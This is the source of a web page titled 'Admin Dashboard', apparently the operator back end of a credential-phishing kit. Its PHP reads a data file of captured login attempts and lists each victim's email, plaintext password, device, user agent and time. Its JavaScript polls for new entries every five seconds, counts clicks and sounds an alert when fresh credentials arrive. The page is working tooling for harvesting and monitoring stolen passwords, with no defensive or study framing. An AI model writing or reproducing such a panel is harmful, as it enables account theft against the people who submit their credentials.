<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .admin-dashboard-card {
            background-color: #f9f9f9;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 95%; /* Make it take most of the screen */
            max-width: 960px; /* Limit maximum width */
            margin: 20px auto;
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }

        .total-clicks {
            text-align: center;
            margin-bottom: 20px;
            font-size: 1.1em;
            font-weight: bold;
            color: #555;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 0.9em;
        }

        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }

        th {
            background-color: #f2f2f2;
            font-weight: bold;
        }

        tr:nth-child(even) {
            background-color: #f5f5f5;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            table {
                font-size: 0.8em;
            }

            th, td {
                padding: 6px;
            }

            /* Make table scrollable on smaller screens */
            .admin-dashboard-card {
                overflow-x: auto;
            }

            table {
                width: auto;
            }
        }

        @media (max-width: 576px) {
            .total-clicks {
                font-size: 1em;
            }
        }

        .logout-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: #007bff;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="admin-dashboard-card">
            <h2>Admin Dashboard</h2>
            <div class="total-clicks">Total Clicks: <span id="total-click-count"><?php echo $total_clicks; ?></span></div>
            <table id="data-table">
                <thead>
                    <tr>
                        <th>Login Attempt</th>
                        <th>Email</th>
                        <th>Password</th>
                        <th>Device</th>
                        <th>User Agent</th>
                        <th>Time</th>
                    </tr>
                </thead>
                <tbody id="data-body">
                    <?php
                    // ... (Your PHP code to display table data remains the same) ...
                    $file = 'data.txt';
                    $data = @file_get_contents($file);
                    $html = '';

                    if ($data) {
                        $lines = explode("------------------------\n", trim($data));
                        foreach ($lines as $line) {
                            $details = explode("\n", trim($line));
                            if (count($details) >= 6) {
                                $html .= "<tr>";
                                $html .= "<td>" . htmlspecialchars(str_replace("Login Attempt: ", "", $details[1])) . "</td>";
                                $html .= "<td>" . htmlspecialchars(str_replace("Email: ", "", $details[2])) . "</td>";
                                $html .= "<td>" . htmlspecialchars(str_replace("Password: ", "", $details[3])) . "</td>";
                                $html .= "<td>" . htmlspecialchars(str_replace("Device Type: ", "", $details[4])) . "</td>";
                                $html .= "<td>" . htmlspecialchars(str_replace("User Agent: ", "", $details[5])) . "</td>";
                                $html .= "<td>" . htmlspecialchars(str_replace("Timestamp: ", "", $details[6])) . "</td>";
                                $html .= "</tr>";
                            }
                        }
                    } else {
                        $html .= '<tr><td colspan="6">No data available.</td></tr>';
                    }

                    echo $html;
                    ?>
                </tbody>
            </table>
            <button id="stop-alert" style="display:none;">Stop Alert</button>
            <a href="admin_logout.php" class="logout-link">Logout</a>
        </div>
    </div>

    <audio id="adminAlertSound" src="admin_alert.mp3" preload="auto" style="display:none;"></audio>

    <script>
        const adminAlertSound = document.getElementById('adminAlertSound');
        const totalClickCountElement = document.getElementById('total-click-count');
        let lastDataLength = 0;
        let alertPlaying = false;
        const stopAlertButton = document.getElementById('stop-alert');
        const dataBody = document.getElementById('data-body');
        let lastClickCount = 0;

        function playAlert() {
            if (!alertPlaying) {
                adminAlertSound.play().catch(error => {
                    console.error("Attempted play:", error);
                });
                alertPlaying = true;
                stopAlertButton.style.display = 'block';

                // Stop the sound after its duration
                setTimeout(() => {
                    adminAlertSound.pause();
                    adminAlertSound.currentTime = 0;
                    alertPlaying = false;
                    stopAlertButton.style.display = 'none';
                }, adminAlertSound.duration * 1000); // Duration in milliseconds
            } else {
                // If already playing, restart it for new alert
                adminAlertSound.pause();
                adminAlertSound.currentTime = 0;
                adminAlertSound.play().catch(error => {
                    console.error("Attempted play (restart):", error);
                });
                setTimeout(() => {
                    adminAlertSound.pause();
                    adminAlertSound.currentTime = 0;
                    alertPlaying = false;
                    stopAlertButton.style.display = 'none';
                }, adminAlertSound.duration * 1000);
            }
        }

        function stopAlert() {
            adminAlertSound.pause();
            adminAlertSound.currentTime = 0;
            alertPlaying = false;
            stopAlertButton.style.display = 'none';
        }

        stopAlertButton.addEventListener('click', stopAlert);

        function fetchData() {
            fetch('get_data.php')
                .then(response => response.json())
                .then(data => {
                    totalClickCountElement.textContent = data.total_clicks;

                    if (data.total_clicks > lastClickCount) {
                        console.log('Total clicks increased, attempting alert.');
                        playAlert();
                    }
                    lastClickCount = data.total_clicks;

                    const currentRows = dataBody.querySelectorAll('tr');
                    dataBody.innerHTML = data.html;
                    const newRows = dataBody.querySelectorAll('tr');

                    if (newRows.length > currentRows.length) {
                        console.log('New data आया, highlighting and attempting alert.');
                        playAlert(); // Attempt to play sound on new data

                        // Highlight the newly added rows
                        newRows.forEach((row, index) => {
                            if (index >= currentRows.length) {
                                row.classList.add('new-data-highlight');
                                setTimeout(() => row.classList.remove('new-data-highlight'), 3000); // Remove highlight after 3 seconds
                            }
                        });
                    }

                    lastDataLength = data.count;
                    attachDeleteListeners();
                })
                .catch(error => {
                    console.error('Error fetching data:', error);
                });
        }

        function attachDeleteListeners() {
            const deleteButtons = document.querySelectorAll('.delete-btn');
            deleteButtons.forEach(button => {
                button.addEventListener('click', function() {
                    const entryToDelete = this.getAttribute('data-entry');
                    if (confirm('Are you sure you want to delete this entry?')) {
                        deleteData(entryToDelete);
                    }
                });
            });
        }

        function deleteData(entryToDelete) {
            fetch('delete_entry.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'entry=' + encodeURIComponent(entryToDelete)
            })
            .then(response => response.text())
            .then(message => {
                alert(message);
                fetchData();
            })
            .catch(error => {
                console.error('Error deleting data:', error);
            });
        }

        // Initial muted play attempt
        adminAlertSound.muted = true;
        adminAlertSound.play().catch(error => {
            console.log("Initial muted play failed:", error);
        }).finally(() => {
            adminAlertSound.muted = false;
        });

        // Initial fetch
        fetchData();

        // Refresh every 5 seconds
        setInterval(fetchData, 5000);

    </script>
</body>
</html>
